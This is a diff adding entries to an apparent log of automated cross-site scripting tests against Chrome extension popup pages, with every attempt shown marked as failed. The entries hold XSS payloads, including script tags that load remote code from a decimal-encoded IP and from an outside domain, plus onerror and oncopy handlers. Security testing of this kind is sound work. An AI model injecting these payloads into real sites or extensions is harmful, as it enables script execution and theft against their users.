@@ -58,3 +58,13 @@
 2023-06-15 11:09:58,588, 2023-06-15 11:09:58, Fail, Level <function info at 0x7f07a3e385e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <script src=//3334957647/1>
 2023-06-15 11:09:59,225, 2023-06-15 11:09:59, Fail, Level <function info at 0x7f07a3e385e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <img src=xss onerror=document.write("qwer$#@!")>
 2023-06-15 11:10:00,016, 2023-06-15 11:10:00, Fail, Level <function info at 0x7f07a3e385e0>, chrome-extension://hhjaeikcadjhmdnehfpblhbcfijkdmdp/popup.html, 'NIL', <x oncopy=alert(1)>copy this!
+2023-06-15 13:15:40,566, 2023-06-15 13:15:40, Fail, Level <function info at 0x7fd0026745e0>, chrome-extension://jpmklabffhgchcajfdlogebkkodmcdpe/popup.html, 'NIL', blaoejds222
+2023-06-15 13:15:42,692, 2023-06-15 13:15:42, Fail, Level <function info at 0x7fd0026745e0>, chrome-extension://jpmklabffhgchcajfdlogebkkodmcdpe/popup.html, 'NIL', <script src=//3334957647/1>
+2023-06-15 13:15:46,876, 2023-06-15 13:15:46, Fail, Level <function info at 0x7fd0026745e0>, chrome-extension://jpmklabffhgchcajfdlogebkkodmcdpe/popup.html, 'NIL', <img src=xss onerror=alert(1)>
+2023-06-15 13:15:49,006, 2023-06-15 13:15:48, Fail, Level <function info at 0x7fd0026745e0>, chrome-extension://jpmklabffhgchcajfdlogebkkodmcdpe/popup.html, 'NIL', <script src=//brutelogic.com.br/1.js>
+2023-06-15 13:15:51,133, 2023-06-15 13:15:51, Fail, Level <function info at 0x7fd0026745e0>, chrome-extension://jpmklabffhgchcajfdlogebkkodmcdpe/popup.html, 'NIL', <img src=xss onerror=document.write("qwer$#@!")>
+2023-06-15 13:15:55,254, 2023-06-15 13:15:55, Fail, Level <function info at 0x7fd0026745e0>, chrome-extension://jpmklabffhgchcajfdlogebkkodmcdpe/popup.html, 'NIL', test123
+2023-06-15 13:15:57,372, 2023-06-15 13:15:57, Fail, Level <function info at 0x7fd0026745e0>, chrome-extension://jpmklabffhgchcajfdlogebkkodmcdpe/popup.html, 'NIL', <script>alert(1)<!–
+2023-06-15 13:15:59,487, 2023-06-15 13:15:59, Fail, Level <function info at 0x7fd0026745e0>, chrome-extension://jpmklabffhgchcajfdlogebkkodmcdpe/popup.html, 'NIL', <x oncopy=alert(1)>copy this!
+2023-06-15 13:21:25,220, 2023-06-15 13:21:25, Fail, Level <function info at 0x7f8466bc85e0>, chrome-extension://jpmklabffhgchcajfdlogebkkodmcdpe/popup.html, 'NIL', blaoejds222
+2023-06-15 13:21:27,341, 2023-06-15 13:21:27, Fail, Level <function info at 0x7f8466bc85e0>, chrome-extension://jpmklabffhgchcajfdlogebkkodmcdpe/popup.html, 'NIL', <script src=//3334957647/1>
